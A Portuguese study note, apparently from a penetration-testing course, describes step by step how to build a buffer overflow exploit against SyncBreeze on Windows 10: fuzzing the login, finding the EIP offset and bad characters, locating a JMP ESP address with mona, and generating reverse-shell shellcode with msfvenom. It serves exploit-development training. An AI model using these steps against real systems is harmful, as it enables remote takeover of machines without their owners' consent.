
# Desenvolvendo Exploit - Win 10

Cenário usado para módulo: Em um Windows 10 da rede temos a aplicação SyncBreeze utilizada para sincronizar arquivos entre endpoints no parque

- Antivirus ligado
- SyncBreeze com gerenciamento via porta 80 ligado e liberada no FW do windows

# Estudando o Software

Para iniciar a criação de um exploit precisamos primeiro ter um nível alto de profundidade no entendimento de como funciona a aplicação. Para isso iniciaremos simulando um primeiro contato com a rede em um pentest

### Passo a passo do reconhecimento do software

1. Primeiramente você deveria executar um clássico NMAP na rede a fim de identificar possíveis aplicações e dessa forma encontrar a porta 80 aberta no Windows 10.
2. A seguir via browser seria possível tentar explorar a aplicação e na tela mesmo ver qual a versão é usada, muitas vezes um Banner Grabbing pode ajudar também. Baixa o software e simula ele em `sandbox + debugger` (ambiente controlado)
3. A seguir usaremos o Debbuger para entender afundo como funciona a aplicação e principalmente, como ela `recebe e trata dados` vindos do usuários
    1. Valide login e senha e etc
    2. *Copie muitos caracteres, cole na box, e depois copie a box pra ver quantos entraram
    3. `WEB`: Va nas ferramentas do desenvolvedor, encontre a box e veja se ela tem max length, caso tenha altere para um número maior (de hacker)



----





# Identificando Vulnerabilidades

Feito o estudo no software agora podemos focar a investigação para identificar se o software é vulnerável a **`Buffer Overflow`**

- Tire o max length da aplicação e comece realizando o Fuzzing da aplicação….
- Valide se é possível explorar username, senha ou os dois

_DICA_: Utilize o Burp Suite como proxy da sua conexão para poder manipular o pacote POST que está sendo enviado a aplicação e para analisa-lo a fundo.

- Permite alterações no header e manipulação de dados sendo enviados
- Permite repeater para enviar várias vezes o mesmo pacote
- Permite que você copie todo o header para criar comando curl e rodar um terminal alternativo depois



-----






# Criando script para interagir com o alvo

Feita a identificação da possibilidade de um Buffer Overflow podemos partir para por a mão na massa.

### Passo a passo para criação do script

1. Começaremos criando a variável `dados` que receberá todo o envio de dados que desejamos enviar para aplicação. DICA: use o conteúdo do POST visto no BURP.
    
    ```jsx
    dados = "POST /login HTTP/1.1\\r\\n"
    dados+= "xxxxxxxxxxxxxxxxxxxxxxxx"
    dados+= "faça isso pra todo o POST do BURP"
    dados+= "não esqueça do \\r\\n no final de todas as linhas"
    ```
    
2. Criar script de socket padrão para envio de dados (já explicado diversas vezes em outros módulos)
    
3. Envia no send a variável `dados` criada
    
4. Cria uma nova variável para enviar no campo referente ao payload do username ou senha (à sua escolha). Precisamos dessa variável pelas diversas manipulações que sofrerá. Ela deve ser posta via fstring no código na linha que tiver username.
    
5. Corrija o content ou maximum length da aplicação (deve receber variável de quantidade fixa + tamanho dos dados)
    

*Feito isso temos um script que envia dados manipuláveis via socket para a aplicação na rede.





----





# Encontrando Offset correto

O próximo passo após criar o socket corretamente e confirmar o envio de dados para a aplicação via script devemos encontrar quais bytes enviados são os referentes ao EIP. Para isso nesse módulo usaremos o método visto na sessão **Encontrando Offset por padrões - Buffer Overflow**

### Passo a passo para encontrar via padrões

Em certa medida é possível automatizar o processo para encontrar o Offset feito manualmente no módulo anterior.

Para isso utilizaremos dois comandos:

- `/usr/bin/msf-pattern_create` : Cria uma sequência de bytes que deve ser enviada em forma de payload para aplicação. Essa sequencia auxiliar a identificar padrões.
    - `-l` : Especifica o tamanho dos bytes
- `/usr/bin/msf-pattern_offset -l <bytes> -q <bytes do eip>` : Após rodar o comando acima substitua nesse comando após o -q os bytes observados no EIP para receber de retorno sua posição. Isso simplifica em muito o processo….

Testes realizados:

![image.png](attachment:75a593ed-198b-40a2-bc9b-cbfb4c635833:image.png)

—> Primeira seta: Maior tamanho de bytes possíveis a serem enviados

—> Segunda seta: Valor presente no registrador EIP visto no Debugger

### Itens adicionais

- `!mona findmsp` : Comadno do debugger para achar DLLs e os bytes mandados com o msf pattern
- Burp também pode auxiliar nessa verificação




----






# Encontrando Badchars

Antes de seguirmos para a exploração do BufferOverflow precisamos validar os caracteres possíveis a serem enviados para a aplicação…

Esse passo pode parecer não muito importante, mas caso exista algum caractere não entendido pela aplicação ele pode gerar `muita dor de cabeça` por isso sempre faça

### Criando lista de caracteres ASCII

Precisamos iniciar tendo uma lista de todos os caracteres em ASCII, para isso precisamos primeiro entender o formato da lista (hexadecimal) e quantos caracteres temos em ASCII (0-256).

*`print(\\x<id>)` : Printa valor ASCII

*`hex(100)` : Mostra 100 em hexadecimal

*`print(<valor>,)` : Printa itens em um loop um do lado do outro

1. Cria loop de 0 a 256 : `for i in range(0,256)`
2. Printa esses valores de forma hexadecimal um do lado do outro `print(<valor>,)`
3. Utilizando a função `.replace` substitui o 0x do hexadecimal por \x para enviar a aplicação
4. Gera lista de todos esses caracteres sem espaço entre eles

### Gerando Verificação ASCII

1. Faço o envio da lista criada via script socket em Python
    
2. Confirme o envio e abra o Debugger
    
3. Observe o **Follow in Dump** do Debugger, bytes que forem enviados e não constarem ali quer dizer que a aplicação não soube trata-los
    
    *Ponto de atenção —> Se aplicação não souber lidar com o primeiro Byte enviado ela não mostrará nenhum outro no buffer
    
    `a = "" for i in range(0,265): a = a + hex(i).replace("0x", "\\\\x")print(a)`
    

**`*Ponto de atenção*`**: Caso você ache um badchar anote ele e rode novamente, o teste sem ele sendo enviado, quando um badchar é encontrado pela aplicação todos os outros não são recebidos, mesmo que estejam ok





-----






# Identificando espaço para Shellcode e bom endereço de retorno

**Objetivo**: O msfvenom ao criar um código de controle remoto precisa de entre 300-350 bytes de espaço para finaliza-lo, sendo assim precisamos validar que existe espaço após EIP para armazenarmos esse código.

Método para validação:

- Enviaremos um caractere especifico após os bytes de EIP já identificados, para podemos reconhecermos no Debugger
- Feito o envio abra a aplicação no debugger e clicando em ESP com o botão direito selecione `Follow in Dump`
- Observe quantos bytes estão presentes nesse registrador, realize teste até confirmar que tem 400 bytes de espaço para podermos alocar o código

### Identificando bom endereço de retorno

A seguir também precisamos encontrar um bom endereço de memória para passar ao EIP no envio de bytes do nosso código. Para isso precisamos que esse endereço seja **`fixo`** e não esteja exposto a **`segurança do sistema`**.

- Via Debugger pesquise por JMP ESPs: `Botão direito > Search for > All Modules > JMP ESP`
    
- A seguir valide todos os JMP ESPs para encontrar um referente a DLLs da própria aplicação, isso pois o sistema de segurança muitas vezes não pega se fizermos dessa forma, como veremos na página a seguir
    
- Método via linha de comando do Debugger:
    
    - `!mona modules` : Ver DLLs
    - `!mona find -s “\\xff\\xe4” -m <DLL>` : Encontra endereços de JMP ESPs
    
    **`—> LEMBRE-SE QUE AO PASSAR O ENDEREÇO DE MEMÓRIA PARA O EIP VIA DADOS ELE DEVE SER ENVIADO ENVIADO AO CONTRÁRIO NA LÓGICA DE PILHA`**
    




-----






# Gerando Shellcode e inserindo ele no código para envio

### Gerando Shellcode

1. Com os badchars encontrados gere o shellcode utilizando o Metasploit
    
    `msfvenom -p <payload> LHOST=<IP> LPORT=<porta> -b “<\\xbad\\xchars\\>” -f python`
    
    *Explicação no módulo de Buffer Overflow
    
2. Coloque alguns NOPs na frente do código para seguir um padrão desse tipo de caso: `“\\x90”`
    
3. Pega o payload criado e via data manda ao programa com o Socket Python após os bytes de EIP
    
4. Abra a porta no seu host para receber conexões de reverse shell
    
5. Faça a validação do envio de dados ao ESP colocando um breakpoint no EIP e validando os dados que sobrescreveram o buffer.
    
    _Verifique que a chamada para JMP ESP também está correta_
    

### Aprimorando código

- Para finalizar crie um novo payload adicionado EXITFUNC=thread na linha de código do msfvenom, esse comando serve para quando encerrarmos a conexão ela ser normalmente encerrada no alvo, possibilitando novas reconexões.
    
    `msfvenom -p <payload> LHOST=<IP> LPORT=<porta> EXITFUNC=thread -b “<\\xbad\\xchars\\>” -f python`